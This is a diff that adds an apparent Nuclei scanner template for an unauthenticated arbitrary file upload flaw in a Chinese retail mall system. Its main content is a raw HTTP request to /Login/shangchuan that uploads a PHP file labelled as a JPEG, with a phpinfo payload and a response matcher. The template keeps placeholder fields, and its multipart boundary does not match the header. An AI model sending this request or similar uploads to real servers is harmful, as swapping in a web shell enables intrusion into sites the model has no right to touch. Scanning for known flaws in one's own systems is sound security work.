@@ -1,0 +1,44 @@
+id: ck13-shangchuan-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: 创客13星零售商城系统前台任意文件上传漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%88%9B%E5%AE%A213%E6%98%9F%E9%9B%B6%E5%94%AE%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /Login/shangchuan HTTP/1.1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br, zstd
+        Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
+        Cache-Control: max-age=0
+        Connection: keep-alive
+        Content-Length: 195
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBP56KuZOdlY4nLGg
+        Host: {{Hostname}}
+        Origin: http://{{Hostname}}
+        Referer: http://{{Hostname}}/Login/shangchuan
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
+        sec-ch-ua-mobile: ?0
+        sec-ch-ua-platform: "Windows"
+        sec-fetch-user: ?1
+
+        ------WebKitFormBoundary03rNBzFMIytvpWhy
+        Content-Disposition: form-data; name="file"; filename="1.php"
+        Content-Type: image/jpeg
+
+        <?php phpinfo();?>
+        ------WebKitFormBoundary03rNBzFMIytvpWhy--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.php'
